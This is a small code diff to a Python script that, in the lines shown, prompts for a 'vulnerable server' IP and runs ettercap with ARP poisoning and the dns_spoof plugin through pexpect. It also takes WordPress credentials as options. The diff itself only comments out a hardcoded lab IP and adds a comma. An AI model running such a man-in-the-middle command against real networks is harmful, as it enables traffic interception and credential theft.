@@ -36,7 +36,7 @@ def get_timestamp():
 
 def ettercap(timestamp, server, username, password):
     ip = input("Enter the IP address of the vulnerable server: ")
-    ip = "192.168.43.131"
+    #ip = "192.168.43.131"
     cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
     print("Ettercap Starting...")
     p = pexpect.spawn(cmd, timeout=None)
@@ -152,7 +152,7 @@ def main(
         password: str = typer.Option(
             ...,
             prompt=True,
-            help=f"WordPress password"
+            help=f"WordPress password",
         ),
         dns_spoof: bool = typer.Option(
             default=True,
